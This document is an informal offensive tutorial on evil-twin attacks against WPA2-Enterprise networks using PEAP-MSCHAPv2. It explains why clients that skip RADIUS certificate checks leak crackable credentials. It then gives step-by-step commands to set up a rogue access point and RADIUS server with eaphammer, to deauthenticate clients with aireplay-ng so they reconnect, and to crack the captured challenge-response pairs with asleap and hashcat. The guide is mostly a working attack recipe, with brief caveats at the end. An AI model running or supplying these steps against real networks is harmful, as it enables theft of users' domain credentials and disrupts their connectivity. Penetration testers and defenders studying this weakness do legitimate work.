# WPA2-Enterprise Evil Twin | EAP/MSCHAPv2 attacks

<img width="940" height="660" alt="wpa2-enterprise-mschapv2-flow" src="https://github.com/user-attachments/assets/e219ec58-7a51-484f-a3c3-1e2f5f11482a" />

## The main idea behind attacking Enterprise networks is 
that WPA2-Enterpise clients auth to whatever first answers as the "RADIUS" server behind the Access Point. Get the AP that speaks EAP and says "yo, go ahead" and a misconfiged client will give you crackable creds instead of a password.

- Most real deploys use `PEAP-MSCHAPv2` (Protected Extensible Auth Protocol with MS-CHAPv2) or sometimes EAP-TTLS. Basically the client sets-up TLS tunnel to "The RADIUS" and then sends MS-CHAPv2 init
- If Client doesn't validate the "RADIUS" server certificate (which is default for most devices) that tunnel can be ours
- In the end we get username + MSCHAPv2 challenge-response pair which we can crack just like NTLM hash

## How EAP/PEAP-MS-CHAPv2 works

So 802.1X splits it into an outer EAP id exchange (usually clear-text so uname is easy to get) + inside auth method.
PEAP wraps that inside method into a TLS tunnel (which doesn't help if the client doesn't check the reciever)

MS-CHAPv2 is just old Microsoft's challenge-response schema - 
- NT hash of the pass -> use as DES3 key against 8-byte AP challenge -> get a 24-byte response

Basically - most of breaks here is about client not checking the certificate. Corporate laptops with good deploy profile won't fall for that, but we all know how it is.

## Attack itself

!!! MONITOR MODE on your adapter, don't forget. 

### Start + Recon

```bash
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0  # Check the adapter

# recon 
sudo airodump-ng wlan0
```

### Cert + RADIUS 

Personally - I'd use eaphammer, it does it's job pretty well, but I haven't seen it within Kali's basic tool-set, so think about looking for it on github 
You could also use `hostapd-wpe` if you're into old, manual routes
```bash
./eaphammer --cert-wizard #just some nonsence to create the certificate

./eaphamer -i wlan0 --channel <CH> --essid "<TargetSSID>" --auth wpa-eap --creds
```
`--creds` makes eaphammer set-up a hostile RADIUS mode, where we accepts any EAP method and logs MS-CHAPv2 pakets

### Force them to reconnect

```bash
sudo aireplay-ng -0 0 -a <AP_MAC> wlan0
```
Same as with basic EvilTwin attack. Sometimes it's even easier cuz they auto reconnect on wake/boot with no user input

### Cracking captured creds

When the client auths to your RADIUS, you get 

`username:challenge:response`

Now to crack it you have 3 options

```bash
asleap -r capture.cap -W rockyou.txt
# or with what you've got
asleap -C <server_challenge> -R <peer_response> -W rockyou.txt
# OR
# Convert to NetNTLMv1
hashcat -m 5500 mschap.hash rockyou.txt
```

## Gotchas
- Only works if the client skips RADIUS cert validation
- PEAP/TTLS means MS-CHAPv2 happens only AFTER TLS tunnel's up. EAP-MD5 skips right to it, but really rare
- Attack is useless if the response is a long random domain password with MFA. Sometimes you can't crack it
